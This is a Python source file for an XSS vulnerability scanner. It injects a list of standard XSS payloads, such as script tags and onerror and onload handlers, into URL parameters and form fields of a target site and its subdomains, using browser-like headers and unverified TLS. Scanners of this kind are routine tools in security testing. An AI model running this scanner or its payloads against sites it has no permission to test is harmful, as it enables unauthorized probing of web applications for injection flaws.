import requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup
import json

class XSSScanner:
    def __init__(self):
        self.payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '"><img src=x onerror=alert("XSS")>',
            "javascript:alert('XSS')",
            '<svg/onload=alert("XSS")>',
            '"onmouseover="alert(\'XSS\')"',
            '"><svg/onload=alert("XSS")>'
        ]
        
        # Add legitimate browser headers
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Cache-Control': 'max-age=0'
        }

    def scan_url(self, url):
        """Scan a URL for potential XSS vulnerabilities"""
        results = {
            "url": url,
            "vulnerable_params": [],
            "vulnerable_forms": [],
            "errors": [],
            "debug_info": {
                "response_received": False,
                "forms_found": 0,
                "params_tested": 0,
                "forms_tested": 0
            }
        }

        try:
            print(f"[*] Starting XSS scan for: {url}")
            # Test URL parameters
            self._test_url_params(url, results)
            
            # Test forms
            self._test_forms(url, results)

        except Exception as e:
            error_msg = f"Error scanning {url}: {str(e)}"
            print(f"[!] {error_msg}")
            results["errors"].append(error_msg)

        print(f"[*] Scan completed for {url}")
        print(f"[*] Debug info: {results['debug_info']}")
        return results

    def _test_url_params(self, url, results):
        """Test URL parameters for XSS vulnerabilities"""
        try:
            print(f"[*] Testing URL parameters for: {url}")
            # First, try to access the site normally
            response = requests.get(url, timeout=10, verify=False, headers=self.headers, allow_redirects=True)
            results["debug_info"]["response_received"] = True
            results["debug_info"]["status_code"] = response.status_code
            results["debug_info"]["response_headers"] = dict(response.headers)
            
            # Check if we're being blocked
            if response.status_code in [403, 429]:
                error_msg = f"Access denied (Status {response.status_code}) - Site may be protected by WAF/Cloudflare"
                print(f"[!] {error_msg}")
                results["errors"].append(error_msg)
                return
            
            # Add some common parameters to test if URL has none
            test_urls = []
            if "?" not in url:
                test_urls.extend([
                    f"{url}?q=test",
                    f"{url}?s=test",
                    f"{url}?search=test",
                    f"{url}?id=1",
                    f"{url}?page=1"
                ])
            else:
                test_urls.append(url)
            
            for test_url in test_urls:
                if "?" in test_url:
                    base_url = test_url.split("?")[0]
                    try:
                        params = dict(pair.split("=") for pair in test_url.split("?")[1].split("&"))
                    except ValueError:
                        print(f"[!] Invalid parameter format in URL: {test_url}")
                        continue
                        
                    print(f"[*] Found parameters: {list(params.keys())}")
                    
                    for param in params:
                        results["debug_info"]["params_tested"] += 1
                        for payload in self.payloads:
                            test_params = params.copy()
                            test_params[param] = payload
                            full_test_url = base_url + "?" + "&".join(f"{k}={v}" for k, v in test_params.items())
                            
                            print(f"[*] Testing parameter '{param}' with payload: {payload}")
                            try:
                                response = requests.get(
                                    full_test_url, 
                                    timeout=10, 
                                    verify=False, 
                                    headers=self.headers,
                                    allow_redirects=True
                                )
                                
                                if payload in response.text:
                                    print(f"[!] Found XSS vulnerability in parameter: {param}")
                                    if param not in results["vulnerable_params"]:
                                        results["vulnerable_params"].append(param)
                                        results["debug_info"]["found_in_responses"] = True
                            except requests.exceptions.RequestException as e:
                                print(f"[!] Error testing parameter {param}: {str(e)}")
                                continue
        except Exception as e:
            error_msg = f"Error testing URL parameters: {str(e)}"
            print(f"[!] {error_msg}")
            results["errors"].append(error_msg)
        except requests.exceptions.RequestException as e:
            error_msg = f"Network error testing URL parameters: {str(e)}"
            print(f"[!] {error_msg}")
            results["errors"].append(error_msg)
        except Exception as e:
            error_msg = f"Error testing URL parameters: {str(e)}"
            print(f"[!] {error_msg}")
            results["errors"].append(error_msg)

    def _test_forms(self, url, results):
        """Test HTML forms for XSS vulnerabilities"""
        try:
            print(f"[*] Testing forms on: {url}")
            response = requests.get(url, timeout=10, verify=False, headers=self.headers, allow_redirects=True)
            
            # Check if we're being blocked
            if response.status_code in [403, 429]:
                error_msg = f"Access denied (Status {response.status_code}) - Site may be protected by WAF/Cloudflare"
                print(f"[!] {error_msg}")
                results["errors"].append(error_msg)
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            
            results["debug_info"]["forms_found"] = len(forms)
            print(f"[*] Found {len(forms)} forms")

            # If no forms found in the main page, try some common paths
            if len(forms) == 0:
                common_paths = ['login', 'register', 'signup', 'contact', 'search', 'feedback']
                for path in common_paths:
                    try:
                        test_url = urljoin(url, path)
                        print(f"[*] Checking {test_url} for forms")
                        response = requests.get(
                            test_url, 
                            timeout=10, 
                            verify=False, 
                            headers=self.headers,
                            allow_redirects=True
                        )
                        if response.status_code == 200:
                            soup = BeautifulSoup(response.text, 'html.parser')
                            forms.extend(soup.find_all('form'))
                    except:
                        continue

            for form in forms:
                form_info = {
                    "action": form.get("action", ""),
                    "method": form.get("method", "get").lower(),
                    "inputs": []
                }
                
                print(f"[*] Testing form: {form_info['action']} ({form_info['method']})")
                
                # Test each input in the form
                for input_field in form.find_all(['input', 'textarea']):
                    input_name = input_field.get('name')
                    if input_name:
                        form_info["inputs"].append(input_name)
                        results["debug_info"]["forms_tested"] += 1
                        
                        # Test each payload
                        for payload in self.payloads:
                            data = {input_name: payload}
                            try:
                                print(f"[*] Testing form input '{input_name}' with payload: {payload}")
                                
                                # Add form-specific headers
                                form_headers = self.headers.copy()
                                form_headers['Content-Type'] = 'application/x-www-form-urlencoded'
                                form_headers['Origin'] = url
                                form_headers['Referer'] = url
                                
                                if form_info["method"] == "post":
                                    response = requests.post(
                                        urljoin(url, form_info["action"]), 
                                        data=data, 
                                        timeout=10, 
                                        verify=False,
                                        headers=form_headers,
                                        allow_redirects=True
                                    )
                                else:
                                    response = requests.get(
                                        urljoin(url, form_info["action"]), 
                                        params=data, 
                                        timeout=10, 
                                        verify=False,
                                        headers=form_headers,
                                        allow_redirects=True
                                    )
                                
                                if payload in response.text:
                                    print(f"[!] Found XSS vulnerability in form: {form_info['action']}, input: {input_name}")
                                    if form_info not in results["vulnerable_forms"]:
                                        results["vulnerable_forms"].append(form_info)
                                    break
                            except requests.exceptions.RequestException as e:
                                print(f"[!] Network error testing form input: {str(e)}")
                                continue
                            except Exception as e:
                                print(f"[!] Error testing form input: {str(e)}")
                                continue

        except Exception as e:
            results["errors"].append(f"Error testing forms: {str(e)}")

def scan_for_xss(target_url, subdomains=None):
    """Main function to scan a target URL and its subdomains for XSS vulnerabilities"""
    results = {
        "main_domain": target_url,
        "scanned_urls": [],
        "total_vulnerabilities": 0
    }
    
    urls_to_scan = set()
    urls_to_scan.add(target_url)
    
    # Add subdomains if provided
    if subdomains:
        for sub in subdomains:
            if target_url.startswith('https://'):
                sub_url = f'https://{sub}'
            else:
                sub_url = f'http://{sub}'
            urls_to_scan.add(sub_url)
    
    scanner = XSSScanner()
    for url in urls_to_scan:
        try:
            scan_result = scanner.scan_url(url)
            results["scanned_urls"].append(scan_result)
            
            # Count vulnerabilities
            vuln_count = len(scan_result["vulnerable_params"]) + len(scan_result["vulnerable_forms"])
            results["total_vulnerabilities"] += vuln_count
            
        except Exception as e:
            results["scanned_urls"].append({
                "url": url,
                "error": str(e),
                "vulnerable_params": [],
                "vulnerable_forms": []
            })
    
    return results

def save_xss_report(domain, results):
    """Save XSS scan results to a JSON file"""
    filename = f"{domain}_xss_report.json"
    with open(filename, 'w') as f:
        json.dump(results, f, indent=2)
    return filename